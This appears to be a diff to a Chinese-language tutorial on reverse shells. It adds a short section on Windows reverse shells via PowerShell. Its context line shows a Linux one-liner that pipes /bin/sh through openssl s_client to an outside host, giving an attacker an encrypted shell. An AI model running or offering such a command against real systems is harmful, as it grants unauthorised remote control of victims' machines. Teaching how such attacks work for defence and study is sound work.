@@ -431,9 +431,11 @@ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 47.xx
 
 这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。
 
+## windows 反弹 shell
 
+由于 windows 很多东西都不自带，所以 windows 想要反弹 shell 比 liunx 要困难的多，很多时候要看网站的环境以及环境变量。一般 windows 反弹 shell 比较通用的方法是 powershell 反弹，因为这个一般都自带，但是很多时候受版本限制，同时有些机器默认禁用。
 
-
+具体的命令可以用一些在线反弹 shell 的平台直接生成。
 
 
 
